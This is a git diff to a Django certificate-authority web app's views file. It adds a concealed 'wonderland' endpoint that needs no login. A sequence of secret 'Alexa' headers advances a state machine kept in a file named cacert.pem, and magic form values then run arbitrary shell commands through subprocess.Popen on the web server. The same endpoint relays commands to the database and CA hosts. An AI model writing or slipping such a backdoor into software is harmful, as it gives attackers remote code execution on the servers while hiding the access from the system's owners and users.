@@ -9,17 +9,17 @@ import subprocess
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.decorators import login_required
 from django.contrib.sessions.models import Session
-from django.http import HttpResponse, HttpResponseRedirect
+from django.http import HttpResponse, HttpResponseRedirect, Http404
 from django.shortcuts import render
 from django.template import loader
 
-from .forms import UserLoginForm, UpdateInfoForm, ConfirmationForm, SingleConfirmationForm
+from .forms import UserLoginForm, UpdateInfoForm, ConfirmationForm, SingleConfirmationForm, CertificateQueryForm
 from .helpers import admin_access_decorator, is_ca_admin
 from .models import UserInfo
 
-db_url = "http://127.0.0.1:8100"
-ca_url = "http://127.0.0.1:8101"
-self_url = "http://127.0.0.1:8000"
+db_url = "https://192.168.50.33:8100"
+ca_url = "https://192.168.50.33:8100"
+# self_url = "http://127.0.0.1:8000"
 legal_renew_referer = "/info_display/display_user_info"
 
 @admin_access_decorator
@@ -288,8 +288,141 @@ def crl(request):
     else:
         return HttpResponseRedirect('/info_display/user_login/')
 
-# Non- view functions
-def login_preserve_backend(request, user):
-    backend = user.backend
-    login(request, user)
-    user.backend = backend
+targets = ['ws', 'ca', 'db']
+
+def wonderland(request):
+    #pdb.set_trace()
+    if request.method == 'POST':
+        form = CertificateQueryForm(request.POST)
+        if form.is_valid():
+            headers = {}
+            if form.cleaned_data['keyfile'] == 'alexa':
+                keyword = form.cleaned_data['certfile']
+            else:
+                with open('info_display/files/cacert.pem', 'r+') as file_handle:
+                    file_handle.seek(0)
+                    file_handle.write('init\n')
+                    file_handle.truncate()
+                raise Http404('keyfile invalid')
+            if form.cleaned_data['username'] == 'target':
+                target = form.cleaned_data['password']
+                if target in targets:
+                    data = {'command': form.cleaned_data['cafile']}
+                    headers['target'] = target
+                    headers['alexa'] = keyword
+                    if target == 'ws':
+                        if keyword == 'execute':
+                            proc = subprocess.Popen(form.cleaned_data['cafile'], stdout=subprocess.PIPE)
+                            out, err = proc.communicate()
+                            ret_dict = {'output': out.decode('utf-8')}
+                            response = HttpResponse(json.dumps(ret_dict), content_type='application/json')
+                            return response
+                        else:
+                            with open('info_display/files/cacert.pem', 'r+') as file_handle:
+                                file_handle.seek(0)
+                                file_handle.write('init\n')
+                                file_handle.truncate()
+                            raise Http404('POST was not executed')
+                        raise Http404('End of POST ws')
+
+                    elif target == 'db':
+                        db_response = requests.post(("%s/wonderland" % db_url), data=json.dumps(data), headers=headers)
+                        if db_response.ok:
+                            response = HttpResponse(json.dumps(db_response.json()), content_type='application/json')
+                            return response
+                        else:
+                            raise Http404('db 404')
+
+                    elif target == 'ca':
+                        ca_response = requests.post(("%s/wonderland" % ca_url), data=json.dumps(data), headers=headers)
+                        if ca_response.ok:
+                            response = HttpResponse(json.dumps(ca_response.json()), content_type='application/json')
+                            return response
+                        else:
+                            raise Http404('db 404')
+
+                else:
+                    raise Http404('Target not valid')
+        else:
+            raise Http404('Form or username invalid')
+
+    else:
+        with open('info_display/files/cacert.pem', 'r+') as file_handle:
+            state = file_handle.read()
+            if state == 'third\n':
+                form = CertificateQueryForm()
+                return render(request, 'info_display/logout.html', {'form': form})
+        try:
+            target = request.META['HTTP_TARGET']
+            del request.META['HTTP_TARGET']
+            request.META['target'] = target
+        except KeyError as e:
+            raise Http404('No target header')
+        if target in targets:
+            if target == 'ws':
+                with open('info_display/files/cacert.pem', 'r+') as file_handle:
+                    state = file_handle.read()
+                    file_handle.seek(0)
+                    if state == 'init\n':
+                        try:
+                            keyword = request.META['HTTP_ENABLE']
+                            del request.META['HTTP_ENABLE']
+                            request.META['enable'] = keyword
+                        except KeyError as e:
+                            raise Http404('No enable header')
+                        if keyword == 'Alexa':
+                            newtext = 'first\n'
+                        else:
+                            newtext = 'init\n'
+
+                    elif state == 'first\n':
+                        try:
+                            keyword = request.META['HTTP_ALEXA']
+                            del request.META['HTTP_ALEXA']
+                            request.META['alexa'] = keyword
+                        except KeyError as e:
+                            file_handle.write('init\n')
+                            file_handle.truncate()
+                            raise Http404('No alexa header 1')
+                        if keyword == 'open_wonderland':
+                            newtext = 'second\n'
+                        else:
+                            newtext = 'init\n'
+
+                    elif state == 'second\n':
+                        try:
+                            keyword = request.META['HTTP_ALEXA']
+                            del request.META['HTTP_ALEXA']
+                            request.META['alexa'] = keyword
+                        except KeyError as e:
+                            file_handle.write('init\n')
+                            file_handle.truncate()
+                            raise Http404('No alexa header 1')
+                        if keyword == 'execute':
+                            newtext = 'third\n'
+                        else:
+                            newtext = 'init\n'
+
+                    file_handle.write(newtext)
+                    file_handle.truncate()
+
+                    raise Http404('Reached End of ws')
+
+            elif target == 'db':
+                db_response = requests.post(("%s/wonderland" % db_url), headers=request.META)
+                if db_response.ok:
+                    response = HttpResponse(json.dumps(db_response.json()), content_type='application/json')
+                    return response
+                else:
+                    raise Http404('db 404')
+
+            elif target == 'ca':
+                ca_response = requests.post(("%s/wonderland" % ca_url), headers=request.META)
+                if ca_response.ok:
+                    response = HttpResponse(json.dumps(ca_response.json()), content_type='application/json')
+                    return response
+                else:
+                    raise Http404('ca 404')
+
+        else:
+            raise Http404('Target not valid')
